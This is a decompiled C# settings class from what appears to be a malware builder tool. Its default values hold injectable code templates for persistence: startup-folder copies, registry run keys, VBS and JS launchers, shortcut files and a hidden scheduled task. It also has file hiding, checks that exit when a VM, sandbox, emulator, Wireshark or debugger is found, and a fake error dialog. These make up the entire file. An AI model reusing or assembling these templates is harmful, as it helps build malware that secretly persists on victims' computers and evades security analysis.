using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;

namespace ClientG.My;

[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "12.0.0.0")]
[CompilerGenerated]
[EditorBrowsable(EditorBrowsableState.Advanced)]
internal sealed class MySettings : ApplicationSettingsBase
{
	private static MySettings defaultInstance = (MySettings)(object)SettingsBase.Synchronized((SettingsBase)(object)new MySettings());

	private static bool addedHandler;

	private static object addedHandlerLockObject = RuntimeHelpers.GetObjectValue(new object());

	public static MySettings Default
	{
		get
		{
			//IL_0036: Unknown result type (might be due to invalid IL or missing references)
			//IL_0040: Expected O, but got Unknown
			if (!addedHandler)
			{
				object obj = addedHandlerLockObject;
				ObjectFlowControl.CheckForSyncLockOnValueType(obj);
				bool lockTaken = false;
				try
				{
					Monitor.Enter(obj, ref lockTaken);
					if (!addedHandler)
					{
						((WindowsFormsApplicationBase)MyProject.Application).add_Shutdown((ShutdownEventHandler)delegate
						{
							if (((WindowsFormsApplicationBase)MyProject.Application).get_SaveMySettingsOnExit())
							{
								((ApplicationSettingsBase)MySettingsProperty.Settings).Save();
							}
						});
						addedHandler = true;
					}
				}
				finally
				{
					if (lockTaken)
					{
						Monitor.Exit(obj);
					}
				}
			}
			return defaultInstance;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue(" try\r\n            {\r\n                Thread.Sleep(int.Parse(\"%S%\"));\r\n            }\r\n            catch\r\n            {\r\n            }")]
	public string sersleep
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("sersleep"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("sersleep", (object)value);
		}
	}

	[DebuggerNonUserCode]
	[UserScopedSetting]
	[DefaultSettingValue(" try\r\n            {\r\n                using (Process p = Process.GetCurrentProcess())\r\n                p.PriorityClass = ProcessPriorityClass.High;  \r\n            }\r\n            catch\r\n            {\r\n            }")]
	public string serprior
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("serprior"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("serprior", (object)value);
		}
	}

	[DefaultSettingValue("            try\r\n            {\r\n                System.IO.File.SetAttributes(Papp, FileAttributes.Hidden | FileAttributes.System);\r\n            }\r\n            catch \r\n            {\r\n            }")]
	[DebuggerNonUserCode]
	[UserScopedSetting]
	public string serhide
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("serhide"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("serhide", (object)value);
		}
	}

	[UserScopedSetting]
	[DefaultSettingValue("new Thread(new ThreadStart(Bypass)).Start();")]
	[DebuggerNonUserCode]
	public string serthbyp
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("serthbyp"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("serthbyp", (object)value);
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("            new Thread(new ThreadStart(INS)).Start();\r\n")]
	public string serthins
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("serthins"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("serthins", (object)value);
		}
	}

	[UserScopedSetting]
	[DefaultSettingValue("try\r\n            {\r\n                string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + \"\\\\%DP%.exe\";\r\n                System.IO.File.Copy(Papp, text, true);\r\n                Process.Start(text);\r\n               Environment.Exit(0);\r\n            }\r\n            catch\r\n            {\r\n            }")]
	[DebuggerNonUserCode]
	public string serdrop
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("serdrop"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("serdrop", (object)value);
		}
	}

	[DebuggerNonUserCode]
	[UserScopedSetting]
	[DefaultSettingValue("try\r\n            {\r\n              string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + \"\\\\%SEXE%.exe\";\r\n              System.IO.File.Copy(Papp, text, true);\r\n             }\r\n            catch  \r\n            {\r\n            }")]
	public string serstrexe
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("serstrexe"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("serstrexe", (object)value);
		}
	}

	[UserScopedSetting]
	[DefaultSettingValue("try\r\n            {\r\n                IR(@\"%RK%\", @\"%RV%\", Papp);\r\n            }\r\n            catch\r\n            {\r\n            }")]
	[DebuggerNonUserCode]
	public string serstrreg
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("serstrreg"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("serstrreg", (object)value);
		}
	}

	[UserScopedSetting]
	[DefaultSettingValue(" try\r\n            {\r\n                System.IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + \"\\\\%SVBS%.vbs\", \"On Error Resume Next\" + Environment.NewLine + \"CreateObject(\\\"WScript.Shell\\\").CurrentDirectory = \\\"\"+\"%FP%\".Replace(\"%FP%\", Path.GetDirectoryName(Papp))+\"\\\"\" + Environment.NewLine + \"CreateObject(\\\"WScript.Shell\\\").Run \\\"\"+\"%FN%\".Replace(\"%FN%\", Path.GetFileName(Papp))+\"\\\"\");\r\n\t\t    }\r\n            catch\r\n            {\r\n            }")]
	[DebuggerNonUserCode]
	public string serstrvbs
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("serstrvbs"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("serstrvbs", (object)value);
		}
	}

	[UserScopedSetting]
	[DefaultSettingValue("try\r\n            {\r\n                System.IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + \"\\\\%SJS%.js\", \"var softgg = new ActiveXObject(\\\"Shell.Application\\\");\" + Environment.NewLine + \"softgg.ShellExecute(\\\"\" + \"%Path%\".Replace(\"%Path%\", Papp.Replace(\"\\\\\", \"\\\\\\\\\")) + \"\\\", \\\"\\\", \\\"\\\", \\\"Open\\\", \\\"1\\\");\");\r\n            }\r\n            catch \r\n            {\r\n            }")]
	[DebuggerNonUserCode]
	public string serstrjs
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("serstrjs"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("serstrjs", (object)value);
		}
	}

	[DebuggerNonUserCode]
	[UserScopedSetting]
	[DefaultSettingValue(" try\r\n            {\r\nCreateShortCut(Papp, Environment.GetFolderPath(Environment.SpecialFolder.Startup), \"%SINK%.Ink\");\r\n\r\n            }\r\n            catch \r\n            {\r\n            }")]
	public string serstrink
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("serstrink"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("serstrink", (object)value);
		}
	}

	[DebuggerNonUserCode]
	[UserScopedSetting]
	[DefaultSettingValue(" try\r\n            {\r\n               CreateShortCut(Papp, Environment.GetFolderPath(Environment.SpecialFolder.Startup), \"%SURL%.url\");\r\n            }\r\n            catch\r\n            {\r\n            }")]
	public string serstrurl
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("serstrurl"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("serstrurl", (object)value);
		}
	}

	[DefaultSettingValue("        public static void CreateShortCut(string okokokok, string ygygygygyg, string ytytytytytyt)\r\n        {\r\n\r\n            using (StreamWriter efyefyeyfe = new System.IO.StreamWriter(ygygygygyg +\"\\\\\" + ytytytytytyt))\r\n            {\r\n                efyefyeyfe.WriteLine(\"[InternetShortcut]\");\r\n                efyefyeyfe.WriteLine(Convert.ToString(\"URL=file:///\" + okokokok));\r\n                efyefyeyfe.WriteLine(\"IconIndex=0\");\r\n                string efekfekfkfefeeee = okokokok.Replace('\\\\', '/');\r\n                efyefyeyfe.WriteLine(Convert.ToString(\"IconFile=\") + \"%SystemRoot%\\\\system32\\\\SHELL32.dll,1\");\r\n                efyefyeyfe.Flush();\r\n            }\r\n        }\r\n")]
	[DebuggerNonUserCode]
	[UserScopedSetting]
	public string funcshortcut
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("funcshortcut"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("funcshortcut", (object)value);
		}
	}

	[DefaultSettingValue(" public static bool ANTIVM()\r\n        {\r\n            bool result = false;\r\n            const string MICROSOFTCORPORATION = \"microsoft corporation\";\r\n            try\r\n            {\r\n                ManagementObjectSearcher searcher =\r\n                    new ManagementObjectSearcher(\"root\\\\CIMV2\", \"SELECT * FROM Win32_BaseBoard\");\r\n\r\n                foreach (ManagementObject queryObj in searcher.Get())\r\n                {\r\n                    result = queryObj[\"Manufacturer\"].ToString().ToLower() == MICROSOFTCORPORATION.ToLower();\r\n                }\r\n                return result;\r\n            }\r\n            catch\r\n            {\r\n                return result;\r\n            }\r\n        }")]
	[UserScopedSetting]
	[DebuggerNonUserCode]
	public string funcantivm
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("funcantivm"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("funcantivm", (object)value);
		}
	}

	[DefaultSettingValue("[DllImport(\"kernel32.dll\")]\r\n        public static extern IntPtr GetModuleHandle(string lpModuleName);\r\n        private static bool ANTISB()\r\n        {\r\n            if (GetModuleHandle(\"SbieDll.dll\").ToInt32() != 0)\r\n            {\r\n                return true;\r\n            }\r\n            else return false;\r\n        }")]
	[DebuggerNonUserCode]
	[UserScopedSetting]
	public string funcantisb
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("funcantisb"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("funcantisb", (object)value);
		}
	}

	[DefaultSettingValue(" private static bool ANTIE()\r\n        {\r\n            long tickCount = Environment.TickCount;\r\n            Thread.Sleep(500);\r\n            long tickCount2 = Environment.TickCount;\r\n            if (((tickCount2 - tickCount) < 500L))\r\n            {\r\n                return true;\r\n            }\r\n            else return false;\r\n        }")]
	[UserScopedSetting]
	[DebuggerNonUserCode]
	public string funcantiem
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("funcantiem"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("funcantiem", (object)value);
		}
	}

	[DebuggerNonUserCode]
	[DefaultSettingValue("private static bool ANTIW()\r\n        {\r\n            Process[] ProcessList = Process.GetProcesses();\r\n            foreach (Process proc in ProcessList)\r\n            {\r\n                if (proc.MainWindowTitle.Equals(\"The Wireshark Network Analyzer\"))\r\n                {\r\n                    return true;\r\n                }\r\n            }\r\n            return false;\r\n        }")]
	[UserScopedSetting]
	public string funcantiw
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("funcantiw"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("funcantiw", (object)value);
		}
	}

	[DefaultSettingValue("[DllImport(\"kernel32\")]\r\n        static extern bool IsDebuggerPresent();")]
	[DebuggerNonUserCode]
	[UserScopedSetting]
	public string funcantid
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("funcantid"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("funcantid", (object)value);
		}
	}

	[DefaultSettingValue("if (ANTIW() == true)\r\n            {\r\n                Environment.Exit(0);\r\n            }")]
	[DebuggerNonUserCode]
	[UserScopedSetting]
	public string subfantiw
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("subfantiw"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("subfantiw", (object)value);
		}
	}

	[DebuggerNonUserCode]
	[DefaultSettingValue(" if (IsDebuggerPresent() == true)\r\n            {\r\n                Environment.Exit(0);\r\n            }")]
	[UserScopedSetting]
	public string subfantid
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("subfantid"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("subfantid", (object)value);
		}
	}

	[DefaultSettingValue(" if (ANTIE() == true)\r\n            {\r\n                Environment.Exit(0);\r\n            }")]
	[DebuggerNonUserCode]
	[UserScopedSetting]
	public string subfantiem
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("subfantiem"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("subfantiem", (object)value);
		}
	}

	[DebuggerNonUserCode]
	[DefaultSettingValue("if (ANTISB() == true)\r\n            {\r\n                Environment.Exit(0);\r\n            }")]
	[UserScopedSetting]
	public string subfantisb
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("subfantisb"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("subfantisb", (object)value);
		}
	}

	[DefaultSettingValue("if (ANTIVM() == true)\r\n            {\r\n                Environment.Exit(0);\r\n            }")]
	[UserScopedSetting]
	[DebuggerNonUserCode]
	public string subfantivm
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("subfantivm"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("subfantivm", (object)value);
		}
	}

	[UserScopedSetting]
	[DefaultSettingValue(" try\r\n            {\r\n                  Interaction.Shell(\"schtasks /create /sc minute /mo %ST% /tn \\\"%SN%\\\" /tr \\\"\" + Papp + \"\\\"\", AppWinStyle.Hide, false, -1);\r\n            }\r\n            catch\r\n            {\r\n            }")]
	[DebuggerNonUserCode]
	public string sersched
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("sersched"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("sersched", (object)value);
		}
	}

	[DebuggerNonUserCode]
	[UserScopedSetting]
	[DefaultSettingValue("[assembly: AssemblyTitle(\"%a1%\")]\r\n[assembly: AssemblyDescription(\"%a2%\")]\r\n[assembly: AssemblyCompany(\"%a3%\")]\r\n[assembly: AssemblyProduct(\"%a4%\")]\r\n[assembly: AssemblyCopyright(\"%a5%\")]\r\n[assembly: AssemblyTrademark(\"%a6%\")]\r\n[assembly: AssemblyVersion(\"%a7%\")]\r\n[assembly: AssemblyFileVersion(\"%a8%\")]")]
	public string serass
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("serass"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("serass", (object)value);
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("try\r\n            {\r\n                MessageBox.Show(\"msgb\", \"msgt\", MessageBoxButtons.OK, MessageBoxIcon.Stop);\r\n            }\r\n            catch\r\n            {\r\n\r\n            }")]
	public string sermsg
	{
		get
		{
			return Conversions.ToString(((ApplicationSettingsBase)this).get_Item("sermsg"));
		}
		set
		{
			((ApplicationSettingsBase)this).set_Item("sermsg", (object)value);
		}
	}

	[DebuggerNonUserCode]
	public MySettings()
	{
	}

	[EditorBrowsable(EditorBrowsableState.Advanced)]
	[DebuggerNonUserCode]
	private static void AutoSaveSettings(object sender, EventArgs e)
	{
		if (((WindowsFormsApplicationBase)MyProject.Application).get_SaveMySettingsOnExit())
		{
			((ApplicationSettingsBase)MySettingsProperty.Settings).Save();
		}
	}
}
